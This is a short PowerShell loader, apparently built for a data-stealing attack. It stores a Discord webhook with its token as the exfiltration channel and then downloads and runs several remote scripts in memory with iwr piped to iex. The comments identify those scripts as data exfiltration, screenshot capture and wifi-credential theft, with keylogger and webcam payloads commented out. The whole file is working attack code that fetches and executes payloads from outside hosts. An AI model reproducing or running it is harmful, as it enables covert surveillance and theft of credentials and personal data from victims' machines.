# Define the Discord Webhook in the current session scope
$Global:dc = "https://discord.com/api/webhooks/1323384833816133724/ehOw_K-Q-attnHgv0g93mWZJQfPE3ApYfsAqYp6cvahyO9oTmhAyHEJ9LJpVgB9wkXjo"

# Array of all your payloads to keep the code clean
$payloads = @(
    "https://is.gd/bw_bh_to_dc",
    "https://is.gd/bwchdbdc",
    "https://is.gd/3RVLLl", # exf dis
    "https://is.gd/8SpcqN", # ss 
    "https://is.gd/b6GaOU", # wifi
    # "https://is.gd/kRX8yM", old master
    # "https://is.gd/iDZWzF", # keylogger
    # "https://is.gd/9eLMGc" # webcam
)

# Execution Loop
foreach ($url in $payloads) {
    try {
        # Use iwr + iex to pull and run each script in memory
        iwr -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content | iex
    } catch {
        # Optional: Silent fail or log to Discord if one link is down
        Write-Host "Error executing $url" -ForegroundColor Red
    }
}
